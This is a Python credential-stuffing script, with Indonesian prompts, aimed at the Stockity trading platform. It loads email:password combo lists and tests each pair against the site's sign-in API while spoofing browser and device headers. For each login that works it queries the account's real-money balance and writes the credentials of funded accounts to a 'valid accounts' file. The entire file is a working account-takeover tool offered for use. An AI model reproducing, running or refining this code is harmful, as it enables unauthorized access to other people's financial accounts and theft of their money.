import requests
import os
from time import sleep

BASE_URL = "https://api.stockity.id"
DEVICE_ID = "820da040cce4a56295955a2e92bc2a4c"
HEADERS = {
    "Host": "api.stockity.id",
    "Device-Type": "web",
    "Device-Id": DEVICE_ID,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "application/json",
    "Content-Type": "application/json"
}
OUTPUT_FOLDER = "stockity"
OUTPUT_FILE = os.path.join(OUTPUT_FOLDER, "valid_accounts.txt")

os.makedirs(OUTPUT_FOLDER, exist_ok=True)

def login(email, password):
    url = f"{BASE_URL}/passport/v2/sign_in?locale=id"
    data = {"email": email, "password": password}
    
    try:
        response = requests.post(url, json=data, headers=HEADERS, timeout=10)
        if response.status_code == 200:
            return response.json()['data']['authtoken']
    except:
        pass
    return None

def get_real_balance(auth_token):
    url = f"{BASE_URL}/bank/v1/read?locale=id"
    headers = {**HEADERS, "Authorization-Token": auth_token}
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            for account in response.json()['data']:
                if account['account_type'] == 'real':
                    return account['balance']
    except:
        pass
    return None

def process_accounts(file_path):
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
        combos = file.read().splitlines()
    
    for i, combo in enumerate(combos, 1):
        if ':' not in combo:
            continue
            
        email, password = combo.split(':', 1)
        print(f"\nChecking {i}/{len(combos)}: {email}")
        
        auth_token = login(email, password)
        if not auth_token:
            print("✖ Login failed")
            continue
        
        balance = get_real_balance(auth_token)
        if balance is None:
            print("✖ Balance check failed")
            continue
        
        if balance > 0:
            save_valid_account(email, password, balance)
            print(f"✔ Valid (Balance: {balance:,} IDR)")
        else:
            print(f"✔ Logged in (Balance: 0 IDR)")
        
        sleep(1)  

def save_valid_account(email, password, balance):
    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{email}:{password} | Balance: {balance:,} IDR\n")

if __name__ == "__main__":
    file_path = input("Masukkan file combo.txt: ").strip('"')
    
    if not os.path.exists(file_path):
        print("File tidak ditemukan!")
        exit()
    
    print(f"\nMemulai pengecekan... (Hasil akan disimpan di {OUTPUT_FILE})")
    process_accounts(file_path)
    print("\nSelesai!")